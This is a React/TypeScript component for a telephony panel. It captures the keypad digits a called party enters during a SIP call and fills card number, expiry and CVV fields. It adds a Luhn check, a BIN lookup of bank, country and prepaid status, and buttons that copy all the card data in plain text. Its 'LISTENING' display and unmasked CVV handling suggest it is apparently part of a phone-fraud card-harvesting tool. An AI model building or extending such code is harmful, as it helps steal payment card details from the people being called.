import { useState, useEffect, useCallback, useRef } from 'react';
import { wsSend } from '../../hooks/useWebSocket';
import { useWsMessage } from '../../hooks/useWsMessage';

interface DtmfCaptureModalProps {
  channel: string;
  sipUser: string;
  onClose: () => void;
}

type FieldName = 'CC' | 'EXP' | 'CVV';

const FIELD_CONFIG: Record<FieldName, { label: string; placeholder: string; maxLen: number; hint: string }> = {
  CC: { label: 'Card Number', placeholder: '---- ---- ---- ----', maxLen: 19, hint: '13-19 digits. Press * to finish early, # to skip field.' },
  EXP: { label: 'Expiry Date', placeholder: 'MM / YY', maxLen: 4, hint: '4 digits (MMYY). Press # to skip.' },
  CVV: { label: 'CVV', placeholder: '---', maxLen: 4, hint: '3-4 digits. Press * to finish early, # to skip.' },
};

function luhnCheck(num: string): boolean {
  if (!num || num.length < 13) return false;
  let sum = 0, alt = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num[i], 10);
    if (isNaN(n)) return false;
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

function formatCC(digits: string): string {
  return digits.replace(/(.{4})/g, '$1 ').trim();
}

function formatEXP(digits: string): string {
  if (digits.length <= 2) return digits + ' / __';
  return digits.substring(0, 2) + ' / ' + digits.substring(2);
}

export function DtmfCaptureModal({ channel, sipUser, onClose }: DtmfCaptureModalProps) {
  const [fields] = useState<FieldName[]>(['CC', 'EXP', 'CVV']);
  const [activeIdx, setActiveIdx] = useState(0);
  const [fieldDigits, setFieldDigits] = useState<Record<FieldName, string>>({ CC: '', EXP: '', CVV: '' });
  const [rawDigits, setRawDigits] = useState<string[]>([]);
  const [binData, setBinData] = useState<any>(null);
  const [fieldStatus, setFieldStatus] = useState<Record<FieldName, string>>({ CC: 'Capturing...', EXP: 'Waiting', CVV: 'Waiting' });
  const dtmfMsg = useWsMessage<any>('dtmf_digit');
  const dtmfDone = useWsMessage<any>('dtmf_done');
  const prevDigitRef = useRef<any>(null);
  const handleDigitRef = useRef<(d: string) => void>(() => {});

  const handleDigit = useCallback((digit: string) => {
    setRawDigits(prev => [...prev, digit]);

    setFieldDigits(prev => {
      const activeField = fields[activeIdx];
      if (!activeField) return prev;

      if (digit === '#') {
        // Skip field
        advanceField();
        return prev;
      }
      if (digit === '*') {
        // Finish field early
        if (prev[activeField].length > 0) advanceField();
        return prev;
      }

      const updated = { ...prev, [activeField]: prev[activeField] + digit };

      // Auto-advance logic
      if (activeField === 'CC' && updated.CC.length >= 16) {
        // Trigger BIN lookup at 6 digits
        if (updated.CC.length === 6) doBinLookup(updated.CC);
        if (updated.CC.length >= 19) {
          setTimeout(() => advanceField(), 0);
        }
      } else if (activeField === 'CC' && updated.CC.length === 6) {
        doBinLookup(updated.CC);
      } else if (activeField === 'EXP' && updated.EXP.length >= 4) {
        setTimeout(() => advanceField(), 0);
      } else if (activeField === 'CVV') {
        const isAmex = prev.CC.startsWith('34') || prev.CC.startsWith('37');
        const maxCvv = isAmex ? 4 : 3;
        if (updated.CVV.length >= maxCvv) {
          setTimeout(() => advanceField(), 0);
        }
      }

      return updated;
    });

    // Play beep
    try {
      const ctx = new AudioContext();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.value = 1200;
      gain.gain.value = 0.1;
      osc.start();
      osc.stop(ctx.currentTime + 0.05);
    } catch {}
  }, [activeIdx, fields]);

  const advanceField = useCallback(() => {
    setActiveIdx(prev => {
      const next = prev + 1;
      setFieldStatus(s => {
        const current = fields[prev];
        const nextField = fields[next];
        const updated = { ...s };
        if (current) updated[current] = 'Done';
        if (nextField) updated[nextField] = 'Capturing...';
        return updated;
      });
      return next;
    });
  }, [fields]);

  const doBinLookup = async (bin6: string) => {
    try {
      const res = await fetch(`/bin-lookup.php?bin=${encodeURIComponent(bin6)}`);
      if (res.ok) {
        const data = await res.json();
        if (!data.error && data.valid !== false) setBinData(data);
      }
    } catch {}
  };

  // Keep ref current and wire up effects AFTER handleDigit is defined
  useEffect(() => { handleDigitRef.current = handleDigit; }, [handleDigit]);

  useEffect(() => {
    if (!dtmfMsg || dtmfMsg === prevDigitRef.current) return;
    prevDigitRef.current = dtmfMsg;
    handleDigitRef.current(dtmfMsg.digit);
  }, [dtmfMsg]);

  useEffect(() => {
    if (dtmfDone && dtmfDone.channel === channel) onClose();
  }, [dtmfDone, channel, onClose]);

  const stopListening = () => {
    wsSend({ cmd: 'stop_listening', channel });
  };

  const copyField = (text: string) => {
    navigator.clipboard.writeText(text).catch(() => {});
  };

  const copyAll = () => {
    const parts = [];
    if (fieldDigits.CC) parts.push(`CC: ${fieldDigits.CC}`);
    if (fieldDigits.EXP) parts.push(`EXP: ${fieldDigits.EXP}`);
    if (fieldDigits.CVV) parts.push(`CVV: ${fieldDigits.CVV}`);
    navigator.clipboard.writeText(parts.join('\n')).catch(() => {});
  };

  const ccValid = fieldDigits.CC.length >= 13 ? luhnCheck(fieldDigits.CC) : null;

  return (
    <div className="modal-overlay" onClick={e => e.target === e.currentTarget && stopListening()}>
      <div className="modal-box" style={{ maxWidth: 640, padding: 0 }} onClick={e => e.stopPropagation()}>
        {/* Header */}
        <div className="panel-header" style={{ borderBottomColor: 'rgba(31,111,235,0.2)', background: 'rgba(22,27,34,0.6)', borderRadius: '16px 16px 0 0' }}>
          <h2 className="flex items-center gap-2">
            <span className="monitoring-badge"><span className="w-2 h-2 rounded-full bg-current" /> LISTENING</span>
            <span className="ml-2">DTMF Capture — <span className="text-ct-accent">{sipUser}</span></span>
          </h2>
          <div className="flex gap-2">
            {(fieldDigits.CC || fieldDigits.EXP || fieldDigits.CVV) && (
              <button onClick={copyAll} className="btn btn-sm">Copy All</button>
            )}
            <button onClick={() => { setFieldDigits({ CC: '', EXP: '', CVV: '' }); setRawDigits([]); setActiveIdx(0); setBinData(null); setFieldStatus({ CC: 'Capturing...', EXP: 'Waiting', CVV: 'Waiting' }); }} className="btn btn-sm">Clear</button>
            <button onClick={stopListening} className="btn btn-sm btn-danger">Stop</button>
          </div>
        </div>

        {/* Capture Fields */}
        <div className="p-4 space-y-3">
          {fields.map((f, i) => {
            const isActive = i === activeIdx;
            const isDone = fieldStatus[f] === 'Done';
            const digits = fieldDigits[f];
            const display = f === 'CC' ? (digits ? formatCC(digits) : FIELD_CONFIG[f].placeholder)
              : f === 'EXP' ? (digits ? formatEXP(digits) : FIELD_CONFIG[f].placeholder)
              : (digits || FIELD_CONFIG[f].placeholder);

            return (
              <div
                key={f}
                className={`p-3.5 rounded-lg border transition-colors cursor-pointer ${
                  isActive ? 'border-ct-blue bg-ct-surface-solid' :
                  isDone ? 'border-ct-green-dark bg-ct-surface-solid' :
                  'border-ct-border-solid bg-ct-bg'
                }`}
                onClick={() => {
                  setActiveIdx(i);
                  setFieldStatus(s => ({ ...s, [f]: 'Capturing...' }));
                }}
              >
                <div className="flex justify-between items-center mb-1.5">
                  <span className="text-xs font-semibold text-ct-muted uppercase tracking-wider">{FIELD_CONFIG[f].label}</span>
                  <div className="flex items-center gap-2">
                    {f === 'CC' && ccValid !== null && (
                      <span className={`text-[11px] px-2 py-0.5 rounded-[10px] ${ccValid ? 'bg-ct-green-bg text-ct-green' : 'bg-ct-red-bg text-ct-red'}`}>
                        {ccValid ? 'Luhn Valid' : 'Luhn Invalid'}
                      </span>
                    )}
                    <span className={`text-[11px] px-2 py-0.5 rounded-[10px] ${
                      isActive ? 'bg-ct-green-bg text-ct-green' :
                      isDone ? 'bg-ct-green-bg text-ct-green' :
                      'bg-ct-border-solid text-ct-muted-dark'
                    }`}>
                      {fieldStatus[f]}
                    </span>
                  </div>
                </div>
                <div className={`font-mono text-2xl tracking-wider ${digits ? 'text-ct-text' : 'text-ct-border-solid'}`}>
                  {display}
                </div>
                <div className="text-[11px] text-ct-muted-dark mt-1">{FIELD_CONFIG[f].hint}</div>
                {digits && (
                  <button onClick={e => { e.stopPropagation(); copyField(digits); }} className="mt-1.5 text-[11px] px-2 py-0.5 rounded border border-ct-border-solid bg-ct-border-solid text-ct-muted hover:text-ct-text transition-colors">
                    Copy
                  </button>
                )}

                {/* BIN Info */}
                {f === 'CC' && binData && (
                  <div className="mt-2 p-2 bg-ct-bg border border-ct-border-solid rounded text-xs">
                    <div className="flex gap-3 flex-wrap">
                      {binData.brand && <span><span className="text-ct-muted-dark">Brand:</span> <span className="text-ct-text-secondary">{binData.brand}</span></span>}
                      {binData.type && <span><span className="text-ct-muted-dark">Type:</span> <span className="text-ct-text-secondary">{binData.type}</span></span>}
                      {binData.bank && <span><span className="text-ct-muted-dark">Bank:</span> <span className="text-ct-text-secondary">{binData.bank}</span></span>}
                      {binData.country && <span><span className="text-ct-muted-dark">Country:</span> <span className="text-ct-text-secondary">{binData.emoji || ''} {binData.country}</span></span>}
                      {binData.prepaid && <span className="text-ct-yellow">Prepaid</span>}
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>

        {/* Raw digits + meta */}
        <div className="px-4 pb-2 font-mono text-xs text-ct-muted-dark">
          <span className="text-ct-border-solid mr-2">Raw:</span>
          {rawDigits.length > 0 ? rawDigits.join('') : '—'}
        </div>
        <div className="flex justify-between px-4 pb-3 text-[11px] text-ct-muted">
          <span>{rawDigits.length} digit(s) captured</span>
          <span>Called party DTMF only | * = finish field | # = skip field</span>
        </div>
      </div>
    </div>
  );
}
